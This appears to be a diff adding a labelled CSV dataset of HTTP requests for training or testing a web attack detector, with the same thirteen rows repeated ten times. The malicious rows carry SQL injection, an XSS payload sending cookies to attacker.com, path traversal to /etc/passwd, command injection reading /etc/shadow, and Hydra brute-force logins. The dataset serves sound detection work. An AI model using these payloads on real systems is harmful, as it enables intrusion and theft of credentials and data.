@@ -1,0 +1,131 @@
+method,path,query,headers,body,label,attack_type
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=187,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=717,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=795,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=825,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=192,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=461,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=460,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=311,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=397,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=953,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=483,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=489,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=578,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=443,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=923,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=658,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=781,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=823,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=972,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=613,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=405,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=604,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=936,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=861,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=647,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=353,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=603,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=242,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=824,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=138,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=178,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=955,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=126,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=580,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=346,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=566,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=879,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=463,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=628,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=512,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=894,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=653,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=584,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=849,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=830,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
+POST,/api/login,,"{""User-Agent"": ""Mozilla/5.0""}",username=admin' OR '1'='1&password=123,1,SQL Injection
+GET,/products,"id=1 UNION SELECT 1,username,password FROM users--","{""User-Agent"": ""sqlmap/1.5""}",,1,SQL Injection
+GET,/search,q=test'; DROP TABLE logs;--,"{""User-Agent"": ""Mozilla/5.0""}",,1,SQL Injection
+POST,/comments,,"{""Content-Type"": ""application/json""}","{""comment"": ""<script>alert(document.cookie)</script>""}",1,XSS
+GET,/profile,name=<img src=x onerror=fetch('http://attacker.com/steal?c='+document.cookie)>,"{""User-Agent"": ""Mozilla/5.0""}",,1,XSS
+GET,/download,file=../../../../etc/passwd,"{""User-Agent"": ""curl/7.68.0""}",,1,Path Traversal
+POST,/api/ping,,"{""User-Agent"": ""Mozilla/5.0""}",ip=127.0.0.1; cat /etc/shadow,1,Command Injection
+POST,/api/login,,"{""User-Agent"": ""Hydra/9.1""}",username=admin&password=password123,1,Brute Force
+GET,/index.html,ref=633,"{""User-Agent"": ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)""}",,0,BENIGN
+GET,/static/css/main.css,v=1.2&ref=555,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/v1/user/settings,ref=340,"{""Authorization"": ""Bearer eyJhbGci...""}","{""theme"": ""dark"", ""notifications"": true}",0,BENIGN
+GET,/api/v1/products,category=electronics&page=2&limit=20&ref=265,"{""User-Agent"": ""Mozilla/5.0""}",,0,BENIGN
+POST,/api/contact,ref=511,"{""Content-Type"": ""application/x-www-form-urlencoded""}",name=John+Doe&email=john%40example.com&message=Hello+support,0,BENIGN
